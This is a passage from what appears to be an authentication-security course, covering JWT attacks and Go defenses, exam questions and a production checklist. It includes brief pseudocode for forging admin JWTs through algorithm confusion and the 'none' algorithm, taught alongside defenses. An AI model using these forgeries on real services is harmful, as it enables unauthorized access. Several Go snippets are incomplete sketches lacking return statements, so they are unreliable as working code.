    }

    // Mark as used
    s.redis.Set(context.Background(), key, "1", time.Until(claims.ExpiresAt.Time))

    return claims, nil
}

// 3. TLS/HTTPS (always)
// 4. Token binding (see section 5.2)
```

### 7.4 JWT Algorithm Confusion

**Attack:**
```javascript
// Attacker changes algorithm from RS256 to HS256
// Uses public key as HMAC secret
header = { "alg": "HS256", "typ": "JWT" }
payload = { "sub": "admin", "role": "admin" }
signature = HMAC-SHA256(header + payload, publicKey)
```

**Defense:**
```go
func ValidateToken(tokenString, secret string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (interface{}, error) {
        // Explicitly check algorithm
        if token.Method.Alg() != "HS256" {
            return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
        }
        return []byte(secret), nil
    })

    // Or use jwt.WithValidMethods
    token, err = jwt.ParseWithClaims(
        tokenString,
        &Claims{},
        getKey,
        jwt.WithValidMethods([]string{"HS256"}), // Whitelist
    )
}
```

### 7.5 Timing Attacks

**Attack:** Measure response times to determine valid users

**Defense:**
```go
func (s *AuthService) Login(req LoginRequest) (*LoginResponse, error) {
    startTime := time.Now()

    user, err := s.userRepo.FindByEmail(req.Email)
    
    var isValid bool
    if err != nil {
        // User not found - still hash to prevent timing
        s.passwordHasher.Hash(req.Password)
        isValid = false
    } else {
        isValid = s.passwordHasher.Compare(user.PasswordHash, req.Password)
    }

    // Constant-time response
    minDuration := 200 * time.Millisecond
    elapsed := time.Since(startTime)
    if elapsed < minDuration {
        time.Sleep(minDuration - elapsed)
    }

    if !isValid {
        return nil, ErrInvalidCredentials
    }

    // Generate tokens...
}
```

### 7.6 None Algorithm Attack

**Attack:**
```javascript
// Set algorithm to "none"
header = { "alg": "none", "typ": "JWT" }
payload = { "sub": "admin" }
token = base64(header) + "." + base64(payload) + "."
```

**Defense:**
```go
// Most libraries prevent this by default
// But always validate:
func ValidateToken(tokenString, secret string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (interface{}, error) {
        // Reject "none" algorithm
        if token.Method == jwt.SigningMethodNone {
            return nil, fmt.Errorf("none algorithm not allowed")
        }
        return []byte(secret), nil
    })
}
```

---

## Exam Questions & Exercises

### Beginner Level

1. **Explain the difference between authentication and authorization.**
2. **What are the three parts of a JWT and what does each contain?**
3. **Implement a basic login function that generates a JWT.**
4. **Write middleware to validate a JWT from the Authorization header.**
5. **Why should you use HttpOnly cookies instead of localStorage for tokens?**

### Intermediate Level

6. **Implement a complete token refresh flow with rotation.**
7. **Design a password reset system with secure token generation.**
8. **Implement Remember Me functionality with different token expiries.**
9. **Create a middleware that checks specific JWT scopes/permissions.**
10. **Implement rate limiting for login endpoints to prevent brute force.**

### Advanced Level

11. **Design a system to detect and prevent token reuse after refresh token rotation.**
12. **Implement device fingerprinting and enforce single-device sessions.**
13. **Create a concurrent session management system limiting users to N active sessions.**
14. **Design a JWT revocation strategy for a distributed microservices system.**
15. **Implement MFA with TOTP and handle the multi-step login flow.**

### Architecture Questions

16. **Compare stateless JWT authentication vs. stateful session authentication for:**
    - Single-page applications
    - Mobile apps
    - Microservices
    - Financial applications

17. **Design an authentication system for a microservices architecture:**
    - Central auth service vs. distributed
    - Token propagation
    - Service-to-service auth

18. **How would you implement instant token revocation while maintaining stateless JWTs?**

19. **Design a strategy for migrating from session-based to JWT-based authentication large-scale application.**

---

## Summary & Key Takeaways

### Security Principles
1. ✅ **Use HTTPS everywhere** - no exceptions
2. ✅ **Short-lived access tokens** (15min) + **Long-lived refresh tokens** (7d)
3. ✅ **HttpOnly, Secure, SameSite cookies** for web apps
4. ✅ **Validate everything**: signature, expiry, audience, issuer
5. ✅ **Never expose sensitive data** in tokens (they're readable!)
6. ✅ **Rotate secrets periodically**
7. ✅ **Implement rate limiting** on auth endpoints
8. ✅ **Log all auth events** for security monitoring
9. ✅ **Use bcrypt/argon2** for password hashing
10. ✅ **Timing-safe comparisons** for security checks

### Common Pitfalls
1. ❌ Storing tokens in localStorage (XSS vulnerable)
2. ❌ Long-lived access tokens (can't revoke easily)
3. ❌ Exposing user existence in error messages
4. ❌ Not validating algorithm in JWT
5. ❌ Hardcoding secrets
6. ❌ Ignoring CSRF with cookie-based auth
7. ❌ Not implementing token rotation
8. ❌ Trusting client-side validation only

### Production Checklist
- [ ] HTTPS enforced
- [ ] Secrets in env vars or secret manager
- [ ] Token expiry configured (short access, longer refresh)
- [ ] Refresh token rotation implemented
- [ ] HttpOnly cookies for web apps
- [ ] CSRF protection if using cookies
- [ ] Rate limiting on auth endpoints
- [ ] Brute force protection
- [ ] Password strength requirements
- [ ] Account lockout after failed attempts
- [ ] Email verification
- [ ] Password reset flow
- [ ] MFA option available
- [ ] Session management (list/revoke)
- [ ] Audit logging
- [ ] Security monitoring/alerts
- [ ] Token blacklist for logout
- [ ] CORS properly configured
- [ ] CSP headers set
- [ ] Input validation & sanitization

---

## Further Reading

### RFCs & Standards
- [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [RFC 6749 - OAuth 2.0](https://tools.ietf.org/html/rfc6749)
- [RFC 7636 - PKCE](https://tools.ietf.org/html/rfc7636)
- [RFC 8705 - OAuth 2.0 Mutual-TLS](https://tools.ietf.org/html/rfc8705)

### Security Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

### Tools & Libraries
- **Go**: `github.com/golang-jwt/jwt/v5`
- **Node.js**: `jsonwebtoken`, `passport-jwt`
- **Python**: `PyJWT`
- **Java**: `jjwt`

---

**End of Course**

*Professor's Note: Authentication and authorization are CRITICAL to application security. Always prioritize security over convenience, validate everything, and stay updated on emerging threats and best practices. Good luck with your implementations!*
